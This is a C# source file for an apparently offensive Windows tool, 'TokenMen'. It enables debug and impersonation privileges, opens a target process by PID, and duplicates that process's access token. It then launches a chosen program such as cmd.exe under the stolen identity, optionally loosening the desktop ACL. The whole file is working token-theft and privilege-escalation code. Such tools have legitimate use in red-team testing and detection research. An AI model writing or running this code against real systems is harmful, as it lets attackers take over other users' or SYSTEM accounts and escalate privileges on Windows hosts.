using System;
using System.Runtime.InteropServices;
using static TokenMen.WinAPI;
using static TokenMen.WinEnums;
using static TokenMen.WinStrcuts;


namespace TokenMen
{
    class Program
    {
        static void Main(string[] args)
        {

            string AppName = AppDomain.CurrentDomain.FriendlyName;
            if (args.Length < 2)
            {
                Console.WriteLine($"Usage: {AppName} <PID> <Program To Launch> [ChangeACL]");
                Console.WriteLine($"Example: {AppName} 3060 cmd.exe");
                return;
            }

            // Get PID of a user's process to grab the token from, and command to launch with that token
            _ = uint.TryParse(args[0], out uint PIDToImpersonate);
            string executableToLaunch = args[1];
            bool changeAcl = args.Length == 3 && args[2].ToLower() == "changeacl" ? true : false;

            Console.WriteLine($"[+] Using token from PID: {PIDToImpersonate} to launch: {executableToLaunch}");

            // Enable Necessary Privileges (Doesn't needed if running from PowerShell)
            // Change PrivilegeEnabler to enable more than one at once by dynamically adjusting the num of privileges we want to enable
            Console.WriteLine("[!] Adjusting Privileges");
            string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
            foreach (string privilege in privileges)
            {
                if (!PrivilegeEnabler(privilege))
                    return;
            }

            // Get Handle to the Process chosen by the user
            IntPtr processHandle = OpenProcess(PROCESS_ACCESS.PROCESS_ALL_ACCESS, true, PIDToImpersonate);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine($"[-] OpenProcess Failed, Error is: {GetLastErrorString}");
                return;
            }
            Console.WriteLine($"[+] Got handle to process");

            // Get Handle to the Process's Token
            bool res = OpenProcessToken(processHandle, TokenAccessRights.TOKEN_DUPLICATE, out IntPtr tokenHandle);
            if (!res)
            {
                Console.WriteLine($"[-] OpenProcessToken Error is: {GetLastErrorString}");
                return;
            }
            Console.WriteLine("[+] OpenProcessToken Success");

            // Duplicate the Primary Token
            uint FULL_ACCESS = 0xF01FF;
            bool dup = DuplicateTokenEx(tokenHandle, FULL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary,
                out IntPtr duplicateTokenHandle);
            if (!dup)
            {
                Console.WriteLine($"[-] DuplicateTokenEx Error is: {GetLastErrorString}");
                return;
            }
            Console.WriteLine("[+] DuplicateTokenEx Success");


            if (changeAcl)
            {
                bool OK = Acl.ChangeDesktopACL();
                if (!OK)
                {
                    Console.WriteLine("[-] Failed to change DACL");
                    return;
                }
                Console.WriteLine("[+] ACLs changed");
            }

            // Create a new Process with the duplicated Primary Token
            var pi = new PROCESS_INFORMATION();
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            bool CreateProcessW = CreateProcessWithTokenW(duplicateTokenHandle, 0, null, executableToLaunch, 0, IntPtr.Zero, null, ref si, out pi);
            if (!CreateProcessW)
            {
                Console.WriteLine($"[-] CreateProcessWithTokenW Failed. (Error: {GetLastErrorString})");
                return;
            }
            Console.WriteLine("[+] CreateProcessWithTokenW Success");
        }

        internal static bool PrivilegeEnabler(string privName)
        {
            OpenProcessToken(GetCurrentProcess(), TokenAccessRights.TOKEN_ADJUST_PRIVILEGES | TokenAccessRights.TOKEN_QUERY, out IntPtr htok);

            TokPriv1Luid tp;
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            LookupPrivilegeValue(null, privName, ref tp.Luid);

            bool retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            if (!retVal)
            {
                Console.WriteLine($"[-] Failed to \"AdjustTokenPrivilege\" Error is: {GetLastErrorString}");
                return false;
            }
            Console.WriteLine($"[+] {privName} Enabled");
            return true;
        }
    }
}